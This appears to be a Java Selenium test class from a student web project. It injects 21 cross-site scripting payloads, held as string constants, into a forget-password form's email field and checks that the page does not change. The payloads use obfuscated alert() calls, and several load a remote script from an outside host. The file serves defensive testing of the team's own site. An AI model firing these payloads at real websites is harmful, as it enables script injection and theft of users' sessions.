/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.ict3103busbly;

//import java.io.ByteArrayOutputStream;
//import java.io.PrintStream;
import org.junit.Before;
import org.junit.Test;
import org.junit.After;
import static org.junit.Assert.*;
import org.openqa.selenium.Alert;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

/**
 *
 * @author pheeb
 */
public class ForgetPasswordXSS {
    
	WebDriver driver = new HtmlUnitDriver(true); 
    WebDriverWait wait; 
    String url = "https://teamname.sitict.net/forgetPassword.php";
    
    String xss1 = "<script>alert(1)</script>";
    String xss2 = "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode<script>alert('xss')</script>";
    String xss3 = "//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
    String xss4 = "'';!--\"<XSS>=&{()}";
    String xss5 ="<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>";
    String xss6 ="<IMG SRC=\"javascript:alert('XSS');\">;";
    String xss7 ="<IMG SRC=javascript:alert('XSS')>";
    String xss8 ="<IMG SRC=javascrscriptipt:alert('XSS')>";
    String xss9 ="<IMG SRC=JaVaScRiPt:alert('XSS')>";
    String xss10 ="<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">";
    String xss11 ="IMG SRC=\" &#14;  javascript:alert('XSS');\">";
    String xss12 ="<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss13 ="<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss14 ="<<SCRIPT>alert(\"XSS\");//<</SCRIPT>";
    String xss15 ="<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>";
    String xss16 ="\\\";alert('XSS');//";
    String xss17 ="</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>";
    String xss18 ="<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">";
    String xss19 ="<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">";
    String xss20 ="<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">";
    String xss21 ="<DIV STYLE=\"width: expression(alert('XSS'));\">";
    		
   
    
    
    
@Before
    public void setUp() { 
		driver = new HtmlUnitDriver(); 
		wait = new WebDriverWait(driver, 30); 
	} 

@After
    public void tearDown() { 
		driver.quit(); 
	}	 
   
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss1() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss1);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss2() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss2);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss3() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss3);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss4() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss4);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss5() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss5);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss6() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss6);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss7() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss7);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss8() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss8);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss9() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss9);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss10() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss10);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss11() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss11);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss12() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss12);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss13() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss13);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss14() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss14);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss15() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss15);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss16() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss16);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss17() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss17);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss18() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss18);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss19() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss19);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void forget_pass_xss20() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss20);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page 
    public void forget_pass_xss21() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forget Password")); 

		//enter input
		//use each and every possible xss statement and inject on email field and submit
		driver.findElement(By.name("email")).sendKeys(xss21);
		//click submit
		driver.findElement(By.name("forget_password")).click();
                
                //check result 
		String expectedResult = "Busbly Forget Password"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    
    
}
